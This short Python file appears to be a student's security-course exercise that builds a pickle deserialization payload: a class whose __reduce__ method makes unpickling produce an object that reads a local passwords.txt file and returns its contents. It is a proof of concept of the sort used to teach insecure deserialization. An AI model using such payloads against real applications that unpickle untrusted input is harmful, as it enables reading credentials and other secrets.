#Lara Babic, 0067638894
import os

PASSWORDS_FILE = r"C:\Users\lara\SC_0067638894\passwords.txt"

class EvilPayload:
    CLASS_NAME = "deserialization.model.evil_payload.EvilPayload"

    def __init__(self):
        self.loosely_defined_thing = self._read_file
        self.method_name = "_read_file"

    def _read_file(self):
        try:
            with open(PASSWORDS_FILE, "r") as f:
                return f"[EvilPayload] File contents:\n{f.read()}"
        except Exception as e:
            return f"[EvilPayload] Could not read file: {e}"

    def __str__(self):
        return self._read_file()

    def __reduce__(self):
        return (_run_evil, ())

def _run_evil():
    obj = object.__new__(EvilPayload)
    obj.loosely_defined_thing = obj._read_file
    obj.method_name = "_read_file"
    return obj